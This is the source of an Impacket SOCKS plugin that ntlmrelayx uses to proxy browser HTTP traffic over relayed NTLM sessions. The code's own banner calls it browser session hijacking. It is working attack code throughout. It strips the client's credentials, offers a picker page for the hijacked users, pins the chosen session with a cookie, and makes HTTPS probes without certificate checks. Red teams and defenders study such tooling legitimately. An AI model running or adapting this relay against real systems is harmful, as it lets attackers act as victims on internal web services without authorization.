# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Socks Proxy for the HTTP Protocol
#
#  A simple SOCKS server that proxies a connection to relayed HTTP connections
#
# Author:
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#   senderend - kernel-mode auth workaround, thread-safe socket locking, session picker UI for multi-relay
#
import base64
from html import escape as html_escape
import select
import socket
import ssl
import urllib.parse
from http.client import HTTPConnection, HTTPSConnection

from impacket import LOG
from lib.relay.servers.socksserver import SocksRelay

# Besides using this base class you need to define one global variable when
# writing a plugin:
PLUGIN_CLASS = "HTTPSocksRelay"
EOL = b'\r\n'

# Debug flag for verbose request/response logging
HTTP_AUTH_DEBUG = False
def _dbg(msg):
    if HTTP_AUTH_DEBUG:
        LOG.debug('[HTTP-DBG] %s' % msg)

class HTTPSocksRelay(SocksRelay):
    PLUGIN_NAME = 'HTTP Socks Plugin'
    PLUGIN_SCHEME = 'HTTP'

    # Cookie name for session persistence (no Expires = session cookie = clears on browser close)
    SESSION_COOKIE = 'ntlmrelay_session'

    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        SocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)
        self.packetSize = 8192
        self.relaySocket = None
        self.session = None

    @staticmethod
    def getProtocolPort():
        return 80

    def initConnection(self):
        pass
        
    def isConnectionAlive(self):
        """Check if the relay connection is still alive"""
        if not self.relaySocket or not self.session:
            return False
        try:
            # Check if socket is readable or in exceptional state
            # Before we send a request, socket should NOT be readable (no pending data)
            # If readable with 0 timeout = server sent data or closed connection
            readable, _, exceptional = select.select([self.relaySocket], [], [self.relaySocket], 0)
            if self.relaySocket in exceptional:
                LOG.debug('HTTP: isConnectionAlive - socket in exceptional state')
                return False
            if self.relaySocket in readable:
                # Socket is readable - unexpected before we send a request
                # This likely means server closed connection (EOF is readable)
                LOG.debug('HTTP: isConnectionAlive - socket unexpectedly readable (server may have closed)')
                return False
            return True
        except (OSError, socket.error) as e:
            LOG.debug('HTTP: isConnectionAlive - connection dead: %s' % str(e))
            return False
        except Exception as e:
            LOG.debug('HTTP: isConnectionAlive exception: %s' % str(e))
            return False  # Assume dead if we can't determine

    def skipAuthentication(self):
        # See if the user provided authentication
        try:
            data = self.socksSocket.recv(self.packetSize)
            if not data:
                LOG.debug('HTTP: No data received from client')
                return False
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            LOG.debug('HTTP: Client connection error: %s' % str(e))
            return False

        # Check if this is a session selection request
        try:
            request_line = data.split(EOL)[0].decode("ascii")
            LOG.debug('HTTP: skipAuthentication called for: %s' % request_line)
        except (UnicodeDecodeError, IndexError):
            LOG.debug('HTTP: Invalid request format')
            return False
            
        # Check for WebSocket upgrade requests and reject them
        headers = self.getHeaders(data)
        if headers.get('upgrade', '').lower() == 'websocket':
            LOG.debug('HTTP: WebSocket upgrade request detected - rejecting')
            response = b'HTTP/1.1 501 Not Implemented\r\nConnection: close\r\n\r\nWebSocket not supported'
            try:
                self.socksSocket.sendall(response)
            except Exception:
                pass
            return False

        if '?session=' in request_line:
            # Extract the original path and session parameter
            path_with_params = request_line.split(' ')[1]  # GET /path?session=user HTTP/1.1
            original_path = path_with_params.split('?')[0]  # /path
            original_path = original_path.replace('\r', '').replace('\n', '')
            session_param = request_line.split('?session=')[1].split(' ')[0]

            # URL decode
            selected_session = urllib.parse.unquote(session_param).upper()

            # Check if this session exists
            if selected_session in self.activeRelays:
                LOG.info('HTTP: Session selected via form: %s@%s(%s)' % (
                    selected_session, self.targetHost, self.targetPort))

                # Redirect with Set-Cookie instead of proxying the first request directly.
                # The browser follows the redirect, the cookie auto-selects the session
                # (via getSessionFromCookie), and the request flows through the normal
                # auto-select → _processRequestWithProbe path.
                cookie_value = urllib.parse.quote(selected_session)
                set_cookie = 'Set-Cookie: %s=%s; Path=/; HttpOnly' % (
                    HTTPSocksRelay.SESSION_COOKIE, cookie_value)

                redirect = (
                    'HTTP/1.1 302 Found\r\n'
                    'Location: %s\r\n'
                    '%s\r\n'
                    'Content-Length: 0\r\n'
                    'Connection: close\r\n'
                    '\r\n' % (original_path, set_cookie)
                ).encode()

                try:
                    self.socksSocket.sendall(redirect)
                except (ConnectionResetError, BrokenPipeError, OSError) as e:
                    LOG.debug('HTTP: Failed to send session redirect: %s' % str(e))
                return False  # Close this SOCKS connection; browser follows redirect
            else:
                # Invalid session, show picker again
                LOG.error('HTTP: Invalid session selected: %s' % selected_session)
        
        # Get headers from data
        headerDict = self.getHeaders(data)
        try:
            creds = headerDict['authorization']
            if 'Basic' not in creds:
                raise KeyError()
            try:
                basicAuth = base64.b64decode(creds[6:]).decode("ascii")
                self.username = basicAuth.split(':')[0].upper()
            except Exception:
                LOG.warning('HTTP: Invalid Basic auth header')
                return False
            if '@' in self.username:
                # Workaround for clients which specify users with the full FQDN
                # such as ruler
                user, domain = self.username.split('@', 1)
                # Currently we only use the first part of the FQDN
                # this might break stuff on tools that do use an FQDN
                # where the domain NETBIOS name is not equal to the part
                # before the first .
                self.username = '%s/%s' % (domain.split('.')[0], user)

            # Check if we have a connection for the user
            if self.username in self.activeRelays:
                # HTTP is stateless - disable inUse check to allow concurrent browser sessions
                # Server handles session persistence via cookies
                # if self.activeRelays[self.username]['inUse'] is True:
                #     LOG.error('HTTP: Connection for %s@%s(%s) is being used at the moment!' % (
                #         self.username, self.targetHost, self.targetPort))
                #     return False
                # else:
                LOG.info('HTTP: Proxying client session for %s@%s(%s)' % (
                    self.username, self.targetHost, self.targetPort))
                self.session = self.activeRelays[self.username]['protocolClient'].session
            else:
                LOG.error('HTTP: No session for %s@%s(%s) available' % (
                    self.username, self.targetHost, self.targetPort))
                return False

        except KeyError:
            # User didn't provide authentication, check available sessions
            LOG.debug('No authentication provided, checking available sessions')
            
            # Find available sessions for this target
            available_users = []
            for user in self.activeRelays.keys():
                # HTTP allows concurrent sessions - ignore inUse flag (likely inherited from other stateful protocols)
                if user not in ['data', 'scheme']: # and not self.activeRelays[user]['inUse']:
                    available_users.append(user)
            
            if len(available_users) == 0:
                # No available sessions, return error
                LOG.error('HTTP: No available sessions for %s(%s)' % (self.targetHost, self.targetPort))
                reply = [b'HTTP/1.1 503 Service Unavailable',b'Connection: close',b'',b'No relayed sessions available for this target']
                self.socksSocket.sendall(EOL.join(reply))
                return False
            elif len(available_users) == 1:
                # Only one session, auto-select it
                self.username = available_users[0]
                LOG.info('HTTP: Auto-selecting single session for %s@%s(%s)' % (
                    self.username, self.targetHost, self.targetPort))
                self.session = self.activeRelays[self.username]['protocolClient'].session

                # Point our socket to the sock attribute of HTTPConnection
                self.relaySocket = self.session.sock

                # Ensure socket is in blocking mode (no timeout) for long-running operations
                if self.relaySocket:
                    self.relaySocket.settimeout(None)
            else:
                # Multiple sessions available - check for session cookie
                cookie_session = self.getSessionFromCookie(headerDict)

                if cookie_session and cookie_session in available_users:
                    # Use session from cookie
                    self.username = cookie_session
                    LOG.debug('HTTP: Using session from cookie: %s@%s(%s)' % (
                        self.username, self.targetHost, self.targetPort))
                    self.session = self.activeRelays[self.username]['protocolClient'].session
                    self.relaySocket = self.session.sock

                    # Ensure socket is in blocking mode (no timeout) for long-running operations
                    if self.relaySocket:
                        self.relaySocket.settimeout(None)
                else:
                    # No valid cookie, show selection page
                    if cookie_session:
                        LOG.debug('HTTP: Cookie session %s not available, showing picker' % cookie_session)
                    else:
                        LOG.info('HTTP: Multiple sessions available, showing selection page')
                    self.showSessionSelection(available_users)
                    return False

        # When we are here, we have a session
        # Point our socket to the sock attribute of HTTPConnection
        # (contained in the session), which contains the socket
        self.relaySocket = self.session.sock

        # Ensure socket is in blocking mode (no timeout) for long-running operations
        if self.relaySocket:
            self.relaySocket.settimeout(None)

        # Browsers open multiple connections in parallel, but we only have one relay
        # socket. Lock it so requests don't stomp on each other.
        try:
            socketLock = self.activeRelays[self.username]['socketLock']
        except KeyError:
            LOG.error('HTTP: Socket lock not found for %s' % self.username)
            return False

        # Check if connection is still alive
        if not self.isConnectionAlive():
            LOG.error('HTTP: Relay connection is dead for session %s' % self.username)
            return False

        # Send the initial request to the server using try-and-fallback logic
        try:
            self._processRequestWithProbe(data, socketLock, protocol='HTTP')
            return True
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            LOG.error('HTTP: Failed to send initial request for session %s: %s' % (self.username, str(e)))
            self._drainRelaySocket()
            return False
    def showSessionSelection(self, available_users):
        """Show HTML page with available session choices that generate Basic Auth headers"""
        
        target = html_escape(str(self.targetHost))
        port = html_escape(str(self.targetPort))

        banner = (
            "  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.\n"
            ".' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\\   | .-'\n"
            "|  |  __ | `-' || | |(_)(_) \\     )| |  (_) \\   | | | || `-'/   | `-.\n"
            "\\  \\ ( _)| .-. || | | | _  \\ \\   (_) |  _  \\ \\  | | | ||   (    | .-'\n"
            " \\  `-) )| | |)|\\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\\ \\   | |\n"
            " )\\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \\)\\  )\\|\n"
            "(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)\n"
        )

        html = '<!DOCTYPE html><html><head><title>ghostsurf</title><style>'
        html += 'body{background:#1a1a1a;color:#ccc;font-family:monospace;margin:0;padding:40px}'
        html += 'pre{color:#555;font-size:11px;margin:0 0 20px;line-height:1.2}'
        html += 'h3{color:#fff;margin:0 0 8px}p{margin:0 0 20px;font-size:13px}'
        html += 'a{display:block;padding:10px 14px;margin:4px 0;background:#252525;'
        html += 'color:#7ec;text-decoration:none;border-left:3px solid #555;font-size:14px}'
        html += 'a:hover{background:#303030;border-color:#7ec}'
        html += '</style></head><body>'
        html += '<pre>%s</pre>' % banner
        html += '<h3>Target: %s:%s</h3>' % (target, port)
        html += '<p>%d sessions available. Select one:</p>' % len(available_users)

        for user in available_users:
            safe_user = html_escape(user)
            html += '<a href="?session=%s">%s</a>' % (safe_user, safe_user)

        html += '</body></html>'
        
        # Send HTTP response with session selection page
        response_body = html.encode('utf-8')
        response = b'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(response_body)
        
        self.socksSocket.sendall(response + response_body)

    def getHeaders(self, data):
        # Get the headers from the request, ignore first "header"
        # since this is the HTTP method, identifier, version
        headerSize = data.find(EOL+EOL)
        if headerSize == -1:
            return {}
        headers = data[:headerSize].split(EOL)[1:]
        headerDict = {}
        for header in headers:
            try:
                hdrKey = header.decode("ascii")
                if ':' in hdrKey:
                    parts = hdrKey.split(':', 1)
                    if len(parts) == 2:
                        headerDict[parts[0].lower()] = parts[1][1:]  # Remove leading space
            except UnicodeDecodeError:
                # Skip headers with non-ASCII characters
                continue
        return headerDict

    def getSessionFromCookie(self, headerDict):
        """Extract session username from our session cookie if present"""
        cookie_header = headerDict.get('cookie', '')
        if not cookie_header:
            return None

        # Parse cookies (format: "name1=value1; name2=value2")
        for cookie in cookie_header.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                if name.strip() == HTTPSocksRelay.SESSION_COOKIE:
                    return urllib.parse.unquote(value.strip()).upper()
        return None

    def _stripSessionCookie(self, cookie_header):
        """Remove our session cookie from Cookie header, return cleaned header or None if empty"""
        try:
            # cookie_header is bytes like b'Cookie: name1=val1; name2=val2'
            header_str = cookie_header.decode('utf-8', errors='replace')
            if ':' not in header_str:
                return cookie_header

            prefix, cookies_str = header_str.split(':', 1)
            cookies = []
            for cookie in cookies_str.split(';'):
                cookie = cookie.strip()
                if not cookie:
                    continue
                if '=' in cookie:
                    name, _ = cookie.split('=', 1)
                    if name.strip() == HTTPSocksRelay.SESSION_COOKIE:
                        continue  # Skip our session cookie
                cookies.append(cookie)

            if cookies:
                return ('%s: %s' % (prefix, '; '.join(cookies))).encode('utf-8')
            else:
                return None  # All cookies were ours, strip the header entirely
        except Exception:
            return cookie_header  # On error, pass through unchanged

    def transferResponse(self, initial_data=None):
        try:
            if initial_data:
                data = initial_data
            else:
                data = self.relaySocket.recv(self.packetSize)
            if not data:
                LOG.debug('HTTP: No data received from relay socket - connection may be closed')
                return

            # === DEBUG: Log response details ===
            try:
                status_line = data.split(b'\r\n')[0].decode('utf-8', errors='replace')
                _dbg('<<< RESPONSE: %s' % status_line)

                # Log key headers for ALL responses
                headers = self.getHeaders(data)
                if 'www-authenticate' in headers:
                    _dbg('<<< WWW-Authenticate: %s' % headers['www-authenticate'])
                if 'set-cookie' in headers:
                    _dbg('<<< Set-Cookie: %s' % headers['set-cookie'])

                # Check for 401 Unauthorized or 400 Bad Request
                if ' 401 ' in status_line or ' 400 ' in status_line:
                    headerSize = data.find(EOL+EOL)
                    if headerSize != -1:
                        try:
                            resp_headers = data[:headerSize].decode('utf-8', errors='replace')
                            LOG.info('HTTP: Error Response Headers (%s):\n%s' % (status_line.strip(), resp_headers))
                        except Exception:
                            pass
            except Exception:
                pass
            # === END DEBUG ===

            headerSize = data.find(EOL+EOL)
            if headerSize == -1:
                LOG.debug('HTTP: No complete headers found in response')
                self.socksSocket.sendall(data)
                return

            headers = self.getHeaders(data)

            try:
                bodySize = int(headers.get('content-length', 0))
                if bodySize > 0:
                    readSize = len(data)
                    expectedTotal = bodySize + headerSize + 4

                    # Make sure we send the entire response, but don't keep it in memory
                    self.socksSocket.sendall(data)
                    while readSize < expectedTotal:
                        try:
                            data = self.relaySocket.recv(self.packetSize)
                            if not data:
                                LOG.debug('HTTP: Connection closed while reading body (read %d of %d)' % (readSize, expectedTotal))
                                break
                            readSize += len(data)
                            self.socksSocket.sendall(data)
                        except (ConnectionResetError, BrokenPipeError, OSError) as e:
                            LOG.debug('HTTP: Connection error while reading response body: %s' % str(e))
                            break
                    LOG.debug('HTTP: Finished reading response - read %d of %d expected bytes' % (readSize, expectedTotal))
                else:
                    # No content-length, check for chunked encoding
                    if headers.get('transfer-encoding', '').lower() == 'chunked':
                        # Chunked transfer-encoding
                        self.transferChunked(data, headers)
                    else:
                        # No body in the response, send as-is
                        self.socksSocket.sendall(data)
            except (ValueError, KeyError):
                # Error parsing content-length or other header issues
                self.socksSocket.sendall(data)
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            LOG.debug('HTTP: Socket error in transferResponse: %s' % str(e))
            # Drain relay socket on timeout to prevent garbage in next request
            if 'timed out' in str(e).lower() or 'timeout' in str(e).lower():
                self._drainRelaySocket()
            # Don't re-raise, let the caller handle the connection cleanup

    def _drainRelaySocket(self):
        """
        Drain remaining response data from relay socket after browser disconnect.
        Prevents leftover data from corrupting subsequent requests on shared socket.
        """
        if not self.relaySocket:
            return
        try:
            # Set short timeout to prevent blocking indefinitely
            original_timeout = self.relaySocket.gettimeout()
            self.relaySocket.settimeout(2.0)

            bytes_drained = 0
            while bytes_drained < 65536:  # Safety limit: drain max 64KB
                chunk = self.relaySocket.recv(self.packetSize)
                if not chunk:
                    break
                bytes_drained += len(chunk)

            if bytes_drained > 0:
                LOG.debug('HTTP: Drained %d bytes from relay socket after browser disconnect' % bytes_drained)

            # Restore original timeout
            self.relaySocket.settimeout(original_timeout)

        except socket.timeout:
            LOG.debug('HTTP: Relay socket drain timeout (socket empty)')
        except Exception as e:
            LOG.debug('HTTP: Error draining relay socket: %s' % str(e))

    def transferChunked(self, data, _headers):
        try:
            headerSize = data.find(EOL+EOL)
            if headerSize == -1:
                LOG.debug('HTTP: Invalid chunked response - no headers')
                return
            try:
                self.socksSocket.sendall(data[:headerSize + 4])
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                LOG.debug('HTTP: Browser disconnected while sending headers: %s' % str(e))
                self._drainRelaySocket()
                return
            body = data[headerSize + 4:]
            if not body:
                LOG.debug('HTTP: No body data for chunked response')
                return
                
            # Size of the chunk
            try:
                eol_pos = body.find(EOL)
                if eol_pos == -1:
                    LOG.debug('HTTP: Invalid chunk size format')
                    return
                datasize = int(body[:eol_pos], 16)
            except ValueError:
                LOG.debug('HTTP: Cannot parse chunk size')
                return
                
            while datasize > 0:
                try:
                    # Size of the total body
                    bodySize = body.find(EOL) + 2 + datasize + 2
                    readSize = len(body)
                    # Make sure we send the entire response, but don't keep it in memory
                    self.socksSocket.sendall(body)
                    while readSize < bodySize:
                        maxReadSize = bodySize - readSize
                        try:
                            body = self.relaySocket.recv(min(self.packetSize, maxReadSize))
                            if not body:
                                LOG.debug('HTTP: Connection closed during chunked transfer')
                                return
                            readSize += len(body)
                            self.socksSocket.sendall(body)
                        except (ConnectionResetError, BrokenPipeError, OSError) as e:
                            LOG.debug('HTTP: Browser disconnected during chunk send: %s' % str(e))
                            self._drainRelaySocket()
                            return
                    
                    try:
                        body = self.relaySocket.recv(self.packetSize)
                        if not body:
                            LOG.debug('HTTP: Connection closed while reading next chunk')
                            return
                        eol_pos = body.find(EOL)
                        if eol_pos == -1:
                            datasize = 0  # Exit loop if no EOL found
                        else:
                            datasize = int(body[:eol_pos], 16)
                    except (ValueError, ConnectionResetError, BrokenPipeError, OSError) as e:
                        LOG.debug('HTTP: Error reading chunk size: %s' % str(e))
                        # Drain relay socket on timeout to prevent garbage in next request
                        if 'timed out' in str(e).lower() or 'timeout' in str(e).lower():
                            self._drainRelaySocket()
                        return
                except Exception as e:
                    LOG.debug('HTTP: Error in chunked transfer loop: %s' % str(e))
                    # If browser disconnected (EPIPE), drain relay socket to prevent garbage on next request
                    if 'EPIPE' in str(e) or 'Broken pipe' in str(e):
                        self._drainRelaySocket()
                    return
                    
            LOG.debug('Last chunk received - exiting chunked transfer')
            try:
                self.socksSocket.sendall(body)
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                LOG.debug('HTTP: Error sending final chunk: %s' % str(e))
                
        except Exception as e:
            LOG.debug('HTTP: Unexpected error in transferChunked: %s' % str(e))

    def extractRequestPath(self, data):
        """Extract the path from HTTP request data"""
        try:
            request_line = data.split(EOL)[0].decode('utf-8', errors='replace')
            parts = request_line.split(' ')
            if len(parts) >= 2:
                return parts[1]  # The path is the second element
        except Exception:
            pass
        return None

    def shouldProbeAnonymous(self):
        """
        Servers with kernel-mode auth (e.g. IIS/HTTP.sys) reset authenticated sessions if
        NTLM auth is sent to resources that don't require it. Probe anonymously first to
        check if the path actually needs auth before using our relay session.
        """
        LOG.debug('HTTP: shouldProbeAnonymous check for %s' % self.username)
        if not self.username:
            LOG.debug('HTTP: shouldProbeAnonymous: No username')
            return False
        if self.username not in self.activeRelays:
            LOG.debug('HTTP: shouldProbeAnonymous: Username not in activeRelays')
            return False
        relayClient = self.activeRelays[self.username]['protocolClient']
        return relayClient.serverConfig.kernelAuth

    def _sendBrowserError(self, code, reason):
        try:
            msg = ('HTTP/1.1 %d %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n' % (code, reason)).encode()
            self.socksSocket.sendall(msg)
        except Exception:
            pass

    def _sendViaRelay(self, tosend, socketLock, protocol):
        """Acquire the relay lock, forward the request, transfer the response.
        On lock-acquire timeout: 503 to browser, session left intact.
        On relay socket timeout/error: 504 to browser, relay socket killed so
        future connections fail isConnectionAlive cleanly instead of reading
        stale response data."""
        if not socketLock.acquire(timeout=15):
            LOG.error('%s: Lock timeout waiting for relay socket (%s)' % (protocol, self.username))
            self._sendBrowserError(503, 'Service Unavailable')
            return False
        try:
            try:
                self.relaySocket.settimeout(10)
                self.relaySocket.sendall(tosend)
                self.transferResponse()
                return True
            except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError) as e:
                LOG.error('%s: Relay socket error, killing session: %s' % (protocol, str(e)))
                self._sendBrowserError(504, 'Gateway Timeout')
                try:
                    self.relaySocket.close()
                except Exception:
                    pass
                return False
        finally:
            try:
                self.relaySocket.settimeout(None)
            except Exception:
                pass
            socketLock.release()

    def _processRequestWithProbe(self, buffer, socketLock, protocol='HTTP'):
        """
        Process request with try-anonymous-first, fallback-to-auth strategy.
        Tries sending request through anonymous connection first. If we get 401,
        fallback to authenticated relay for NTLM. Caches results per path.
        """
        if not self.shouldProbeAnonymous():
            # Kernel auth mode not enabled, use authenticated relay normally
            tosend = self.prepareRequest(buffer)
            self._sendViaRelay(tosend, socketLock, protocol)
            return

        relayClient = self.activeRelays[self.username]['protocolClient']
        path = self.extractRequestPath(buffer)
        tosend = self.prepareRequest(buffer)

        # Cache lookup
        path_without_query = path.split('?')[0] if path and '?' in path else path
        cache_key = (relayClient.targetHost, relayClient.targetPort, path_without_query)
        authCache = type(relayClient).authCache

        if cache_key in authCache and authCache[cache_key]:
            # Cached as needs auth - use authenticated relay directly
            LOG.debug('%s: Cache HIT (auth) %s' % (protocol, path))
            self._sendViaRelay(tosend, socketLock, protocol)
            return

        # Try anonymous connection
        try:
            if protocol == 'HTTPS':
                uv_context = ssl.SSLContext()
                anonConn = HTTPSConnection(relayClient.targetHost, relayClient.targetPort, context=uv_context)
            else:
                anonConn = HTTPConnection(relayClient.targetHost, relayClient.targetPort)
            anonConn.connect()
        except Exception as e:
            LOG.error('%s: Anon connection failed: %s, using auth relay' % (protocol, str(e)))
            self._sendViaRelay(tosend, socketLock, protocol)
            return

        try:
            # Send request through anonymous connection
            anonConn.sock.sendall(tosend)

            # Read initial response to check for 401
            initial_data = anonConn.sock.recv(self.packetSize)

            if not initial_data:
                LOG.debug('%s: No response from anon connection' % protocol)
                try:
                    anonConn.close()
                except Exception:
                    pass
                self._sendViaRelay(tosend, socketLock, protocol)
                return

            # Decision: is it a 401?
            if b'401' in initial_data[:50] and b'WWW-Authenticate' in initial_data:
                # Needs auth - close anon, retry through auth relay
                LOG.info('%s: Path %s requires auth (cached)' % (protocol, path))
                authCache[cache_key] = True
                try:
                    anonConn.close()
                except Exception:
                    pass

                self._sendViaRelay(tosend, socketLock, protocol)
            else:
                # Success - forward response with initial data we already read
                LOG.debug('%s: Path %s OK anonymously (cached)' % (protocol, path))
                authCache[cache_key] = False
                # Save original relay socket, use anon for this response, then restore
                original_relay = self.relaySocket
                self.relaySocket = anonConn.sock
                self.transferResponse(initial_data=initial_data)
                self.relaySocket = original_relay
                try:
                    anonConn.close()
                except Exception:
                    pass

        except Exception as e:
            LOG.debug('%s: Anon error: %s, falling back to auth' % (protocol, str(e)))
            try:
                anonConn.close()
            except Exception:
                pass
            self._sendViaRelay(tosend, socketLock, protocol)

    def prepareRequest(self, data):
        # Parse the HTTP data, removing headers that break stuff
        response = []

        # === DEBUG: Log request line ===
        try:
            req_line = data.split(EOL)[0].decode('utf-8', errors='replace')
            _dbg('>>> REQUEST: %s' % req_line)
        except Exception: pass
        # === END DEBUG ===

        for part in data.split(EOL):
            # This means end of headers, stop parsing here
            if part == b'':
                break
            # Remove the Basic authentication header
            if b'authorization' in part.lower():
                _dbg('>>> Stripped: %s' % part.decode('utf-8', errors='replace'))  # DEBUG
                continue
            # Don't close the connection
            if b'connection: close' in part.lower():
                response.append(b'Connection: Keep-Alive')
                continue
            # Strip our session cookie from Cookie header before forwarding to target
            if part.lower().startswith(b'cookie:'):
                cleaned_cookie = self._stripSessionCookie(part)
                if cleaned_cookie:
                    response.append(cleaned_cookie)
                    _dbg('>>> Cookie (cleaned): %s' % cleaned_cookie.decode('utf-8', errors='replace'))
                else:
                    _dbg('>>> Cookie stripped entirely (only had our session cookie)')
                continue
            # If we are here it means we want to keep the header
            response.append(part)
        # Append the body
        response.append(b'')
        body_parts = data.split(EOL+EOL)
        if len(body_parts) > 1:
            response.append(body_parts[1])
        else:
            response.append(b'')  # No body for GET requests
        senddata = EOL.join(response)

        # Check if the body is larger than 1 packet
        headerSize = data.find(EOL+EOL)
        headers = self.getHeaders(data)
        try:
            bodySize = int(headers.get('content-length', 0))
            if bodySize > 0:
                readSize = len(data)
                while readSize < bodySize + headerSize + 4:
                    try:
                        additional_data = self.socksSocket.recv(self.packetSize)
                        if not additional_data:
                            LOG.debug('HTTP: Client closed connection while reading request body')
                            break
                        readSize += len(additional_data)
                        senddata += additional_data
                    except (ConnectionResetError, BrokenPipeError, OSError) as e:
                        LOG.debug('HTTP: Connection error while reading request body: %s' % str(e))
                        break
        except (KeyError, ValueError):
            # No body or invalid content-length, could be a simple GET or a POST without body
            # no need to check if we already have the full packet
            pass
        return senddata


    def tunnelConnection(self):
        # Get the socket lock for this session
        try:
            socketLock = self.activeRelays[self.username]['socketLock']
        except KeyError:
            LOG.error('HTTP: Socket lock not found for %s in tunnel' % self.username)
            return

        buffer = b''
        while True:
            try:
                data = self.socksSocket.recv(self.packetSize)
                # If this returns with an empty string, it means the socket was closed
                if not data:
                    LOG.debug('HTTP: Client closed connection')
                    return
                
                buffer += data

                # Check if we have a complete header block
                if b'\r\n\r\n' not in buffer:
                    # Keep reading
                    continue

                # Check for WebSocket upgrade requests in tunnel mode
                try:
                    headers = self.getHeaders(buffer)
                    if headers.get('upgrade', '').lower() == 'websocket':
                        LOG.debug('HTTP: WebSocket upgrade in tunnel - rejecting')
                        response = b'HTTP/1.1 501 Not Implemented\r\nConnection: close\r\n\r\nWebSocket not supported'
                        try:
                            self.socksSocket.sendall(response)
                        except Exception:
                            pass
                        return
                except Exception:
                    # Continue with normal processing if header parsing fails
                    pass

                # Process request with kernel auth try-and-fallback logic
                self._processRequestWithProbe(buffer, socketLock, protocol='HTTP')

                # Reset buffer after processing a full request-response cycle
                buffer = b''
                
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                LOG.debug('HTTP: Connection error in tunnel: %s' % str(e))
                return
            except Exception as e:
                LOG.debug('HTTP: Unexpected error in tunnel: %s' % str(e))
                return
